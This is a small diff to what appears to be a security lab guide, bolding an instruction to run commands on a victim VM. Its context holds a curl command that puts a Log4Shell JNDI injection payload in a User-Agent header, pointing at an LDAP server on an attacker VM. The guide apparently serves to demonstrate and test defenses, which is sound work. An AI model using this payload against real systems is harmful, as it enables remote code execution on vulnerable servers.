@@ -19,7 +19,7 @@ Go to **Policy > Network Rules** and delete the rule
 
 Execute the request to trigger the attack:
 
-Run the following commands on the victim01 VM.
+**Run the following commands on the victim01 VM.**
 
 ```ctr
 curl http://sample-app.default.${vminfo:victim01:public_ip}.sslip.io/login -d "uname=test&password=invalid" -H 'User-Agent: ${jndi:ldap://${vminfo:attacker01:public_ip}:1389/a}'
